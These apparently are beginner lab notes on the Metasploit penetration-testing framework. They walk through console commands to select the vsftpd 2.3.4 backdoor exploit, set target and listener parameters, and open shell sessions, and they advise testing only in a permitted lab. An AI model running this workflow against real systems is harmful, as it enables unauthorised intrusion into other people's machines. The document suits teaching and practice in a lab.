Metasploit Lab Notes
1. Introduction

Metasploit is a penetration testing framework used for developing, testing, and executing exploits against target systems.

It consists of:

Exploits: Code that takes advantage of vulnerabilities
Payloads: Code executed after successful exploitation
Auxiliary modules: Scanners and supporting tools
2. Starting Metasploit

Open terminal and run:

msfconsole

You will see the Metasploit console prompt:

msf6 >
3. Basic Commands
Command	Description
help	Display all available commands
search <keyword>	Search for modules
use <module>	Select a module
show options	Display required parameters
set <option>	Set a parameter value
unset <option>	Clear a parameter value
run / exploit	Execute the module
back	Exit current module
exit	Quit Metasploit
4. Searching for Exploits

Example:

search vsftpd

Example output:

exploit/unix/ftp/vsftpd_234_backdoor
5. Selecting an Exploit
use exploit/unix/ftp/vsftpd_234_backdoor
6. Viewing Options
show options

Common parameters:

RHOSTS: Target IP address
RPORT: Target port
7. Setting Target Parameters
set RHOSTS <target-ip>

Example:

set RHOSTS 192.168.1.5
8. Running the Exploit
run

or

exploit

If successful, a session (shell access) will be opened.

9. Session Management

List active sessions:

sessions

Interact with a session:

sessions -i <session-id>
10. Useful Additional Commands

Show available payloads:

show payloads

Set payload:

set PAYLOAD <payload-name>

Set local host (attacker machine):

set LHOST <your-ip>

Set local port:

set LPORT <port>
11. Typical Workflow

Start Metasploit:

msfconsole

Search for exploit:

search <service>

Select exploit:

use <exploit-path>

View options:

show options

Set required parameters:

set RHOSTS <target-ip>

Execute:

exploit
12. Safe Lab Setup

Recommended environment:

Attacker: Kali Linux
Target: Metasploitable2 (intentionally vulnerable system)

Use virtualization software such as:

VirtualBox
VMware

Ensure both machines are on the same network.

13. Important Notes
Perform testing only in a controlled lab environment
Do not target systems without permission
Most real-world systems are patched and secured
Proper reconnaissance and scanning are required before exploitation
14. Summary

Metasploit simplifies penetration testing by providing:

Pre-built exploits
Payload generation
Automated attack execution

Core workflow:

Search → Use → Set → Exploit